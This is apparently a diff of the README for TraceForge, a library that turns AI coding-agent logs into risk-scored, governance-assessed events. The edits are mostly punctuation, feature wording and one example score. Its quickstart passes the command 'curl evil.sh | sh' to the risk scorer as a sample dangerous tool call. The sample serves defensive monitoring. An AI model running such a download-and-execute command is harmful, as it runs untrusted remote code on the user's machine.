@@ -19,10 +19,10 @@
 
 ---
 
-TraceForge is a framework-agnostic, **CPU-only** Python library that turns the raw session logs of
-AI coding agents into a clean, strongly-typed event stream — classified, risk-scored, and
+TraceForge is a framework-agnostic Python library that turns the raw session logs of
+AI coding agents into a clean, strongly-typed event stream, classified, risk-scored, and
 governance-assessed in real time. Adding support for a new agent framework requires only a **YAML
-mapping file** — no code.
+mapping file**: no code.
 
 ```text
 Source → [Parser] → Adapter → Enricher → Pipeline → Sink(s)
@@ -35,9 +35,9 @@ Source → [Parser] → Adapter → Enricher → Pipeline → Sink(s)
 2. **Parsers** pre-process non-structured formats (markdown logs, chunked data) into structured dicts.
 3. **Adapters** parse raw input into a common `SessionEvent` type using declarative YAML mappings.
 4. **Enricher** adds metadata: tool pairing, duration, multi-dimensional classification, risk scoring, visibility.
-5. **Pipeline** stamps live structure — phase, activity/step boundaries, titles — then routes events to one or more sinks with error isolation.
+5. **Pipeline** stamps live structure, phase, activity/step boundaries, titles, then routes events to one or more sinks with error isolation.
 6. **Sinks** write to storage backends or call custom handlers.
-7. **Governance** (opt-in) scores the same events — data labeling, taint / drift / budget tracking, rule evaluation — into per-event recommendations, with optional gate policies for enforcement.
+7. **Governance** (opt-in) assesses the same events (data labeling, taint / drift / budget tracking, rule evaluation) into per-event recommendations, with optional gate policies for enforcement.
 
 ## Quickstart
 
@@ -45,7 +45,7 @@ Source → [Parser] → Adapter → Enricher → Pipeline → Sink(s)
 pip install traceforge      # or: uv add traceforge
 ```
 
-Everything ships in a single install — no extras, no GPU, no torch. Describe a pipeline in
+Everything ships in a single install, no extras, no GPU, no torch. Describe a pipeline in
 `traceforge.yaml`:
 
 ```yaml
@@ -54,8 +54,8 @@ pipelines:
   - name: copilot-local
     source:
       type: file_watch
-      path: ~/.copilot/logs/
-      glob: "*.jsonl"
+      path: ~/.copilot/logs/session.jsonl   # one agent log file
+      start_at: end                          # or "beginning" to replay existing lines
     adapter:
       type: mapped_json
       mapping: copilot
@@ -79,7 +79,7 @@ trace = pipeline.score_tool_call({                # read-only risk assessment
     "tool_input": {"command": "curl evil.sh | sh"},
     "session_id": "demo",
 })
-print(trace.risk_score, trace.suggested_action)   # e.g. 82 deny
+print(trace.risk_score, trace.suggested_action)   # e.g. 72 escalate
 ```
 
 See the **[Getting Started guide](https://dfinson.github.io/traceforge/docs/getting-started/installation)**
@@ -90,42 +90,42 @@ for the full CLI (`watch`, `replay`, `score`, `gate`, `init`, `detect`, `status`
 | | |
 | --- | --- |
 | 🧩 **Framework-agnostic** | 22 bundled YAML mappings covering Copilot, Claude Code, Cline, Aider, CrewAI, LangGraph, OpenHands, PydanticAI, smolagents, Goose, and more. |
-| 🖥️ **CPU-only** | Packaged ONNX models — no torch, no GPU. Runs anywhere Python does. |
+| 🖥️ **Runs anywhere** | Installs and runs anywhere Python does, from a laptop to CI. No GPU or heavyweight ML stack; the structuring models are packaged ONNX. |
 | 🏷️ **Rich classification** | 7-dimension taxonomy, tree-sitter shell AST, MCP profiles, 0–100 risk scoring with MITRE ATT&CK mappings. |
 | 🧠 **Live structure** | Phase, activity/step boundaries, and human-readable titles stamped as events arrive. |
 | 🛡️ **Governance** | Data labeling, information-flow control, drift & budget tracking, and `allow/warn/escalate/deny/transform` recommendations. |
-| 🔌 **Pluggable sinks** | JSONL, SQLite, S3, Parquet, OpenTelemetry, webhook, console, and custom callbacks — all YAML-configurable. |
+| 🔌 **Pluggable sinks** | JSONL, SQLite, S3, Parquet, OpenTelemetry, webhook, console, and custom callbacks, all YAML-configurable. |
 
 ## Documentation
 
 The complete docs live at **[dfinson.github.io/traceforge](https://dfinson.github.io/traceforge/)**:
 
-- **[Introduction](https://dfinson.github.io/traceforge/docs/intro)** — what TraceForge is and why.
-- **[Architecture](https://dfinson.github.io/traceforge/docs/architecture/overview)** — the pipeline stages and event model.
-- **[Getting Started](https://dfinson.github.io/traceforge/docs/getting-started/installation)** — install, first run, and CLI reference.
-- **[Configuration](https://dfinson.github.io/traceforge/docs/configuration)** — `TRACEFORGE_*` env vars and `traceforge.yaml`.
-- **[Governance](https://dfinson.github.io/traceforge/docs/governance/overview)** — the monitor, the shield, and the gate.
-- **[Reference](https://dfinson.github.io/traceforge/docs/reference/sources)** — sources, adapters, enrichment, classification, sinks, and the SDK.
+- **[Introduction](https://dfinson.github.io/traceforge/docs/intro)**: what TraceForge is and why.
+- **[Architecture](https://dfinson.github.io/traceforge/docs/architecture/overview)**: the pipeline stages and event model.
+- **[Getting Started](https://dfinson.github.io/traceforge/docs/getting-started/installation)**: install, first run, and CLI reference.
+- **[Configuration](https://dfinson.github.io/traceforge/docs/configuration)**: `TRACEFORGE_*` env vars and `traceforge.yaml`.
+- **[Governance](https://dfinson.github.io/traceforge/docs/governance/overview)**: the monitor, the shield, and the gate.
+- **[Reference](https://dfinson.github.io/traceforge/docs/reference/sources)**: sources, adapters, enrichment, classification, sinks, and the SDK.
 
 The authoritative technical spec remains in [`SPEC.md`](SPEC.md).
 
 ## Design principles
 
-- **Observation-first** — observes, enriches, and recommends by default; enforcement is strictly opt-in (a registered gate policy).
-- **Framework-agnostic** — new framework support = new YAML file.
-- **Defensive parsing** — malformed input is logged and skipped, never crashes.
-- **Immutable domain objects** — events are frozen models.
-- **Error isolation** — one failing sink cannot block others.
-- **Data-driven** — classification, risk scoring, and MCP profiles are externalized to YAML.
+- **Observation-first**: observes, enriches, and recommends by default; enforcement is strictly opt-in (a registered gate policy).
+- **Framework-agnostic**: new framework support = new YAML file.
+- **Defensive parsing**: malformed input is logged and skipped, never crashes.
+- **Immutable domain objects**: events are frozen models.
+- **Error isolation**: one failing sink cannot block others.
+- **Data-driven**: classification, risk scoring, and MCP profiles are externalized to YAML.
 
 ## Contributing
 
-Contributions welcome — see **[CONTRIBUTING.md](CONTRIBUTING.md)** for dev setup with `uv`, running
+Contributions welcome, see **[CONTRIBUTING.md](CONTRIBUTING.md)** for dev setup with `uv`, running
 the test suite, linting with `ruff`, and how to add a new agent framework mapping.
 
 ## Status
 
-🚧 **Under active development** — not yet published to PyPI. The pipeline is feature-complete:
+🚧 **Under active development**: not yet published to PyPI. The pipeline is feature-complete:
 sources, adapters, enricher, classification, risk scoring, live phase/boundary/title structuring,
 the governance engine, all storage sinks, and the `traceforge` CLI all ship today.
 
